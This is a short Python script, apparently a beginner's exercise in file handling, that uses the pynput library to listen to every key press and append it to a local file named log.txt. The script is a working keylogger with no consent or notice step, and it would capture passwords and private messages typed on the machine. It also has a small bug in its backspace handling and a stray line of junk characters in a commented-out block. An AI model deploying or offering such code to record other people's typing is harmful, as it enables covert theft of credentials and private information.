# Time Taken : 1 hour
# Storing the keystrokes in a text file.
# File Handling - How to read, write & append to a file.
# "with" keyword is used for automatically releasing resources so no need to mention close() function.
# Using pynput package we can control our input devices like mouse/keyboard etc.

""" file = open("log.txt","a")
file.write("My name is Mitesh")
data = file.read() zdczcddvsd  asdfghjkl
print(data)
file.close() """

from pynput.keyboard import Listener

def writeToFile(key):
    data = str(key)
    
    if data == 'Key.space':
        data = " "
    if data == 'Key.ctrl_l':
        data = ""
    if data == 'Key.enter':
        data = "\n"    
    if data == 'Key.alt_l':
        data = ""
    if data == 'Key.caps_lock':
        data = ""
    if data == 'Key.tab':
        data = " "
    if data == 'Key.shift_l' or data == 'Key.shift_r':
        data = ""
    if data == 'Key.backspace':
        data == ""
    
    with open("log.txt","a") as file:
        file.write(data.replace("'",""))

with Listener(on_press=writeToFile) as listener:
    listener.join()